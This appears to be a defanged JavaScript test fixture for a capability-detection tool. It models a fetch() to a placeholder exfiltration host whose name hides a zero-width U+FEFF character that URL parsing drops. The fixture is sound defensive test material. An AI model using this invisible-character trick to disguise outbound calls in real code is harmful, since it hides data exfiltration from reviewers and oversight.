// DEFANGED RECONSTRUCTION for ADR-032, modeled on the U+FEFF host evasion.
// Synthetic, not a historical artifact. Parsed by capdelta tests only; never
// imported, installed, or executed.
// Kept: a fetch whose host holds a U+FEFF escape; the URL parser drops it.
// Omitted: every network call; the host is a reserved .example.test name.
module.exports = function run() {
  return fetch("https://exfil\uFEFF.example.test/c");
};
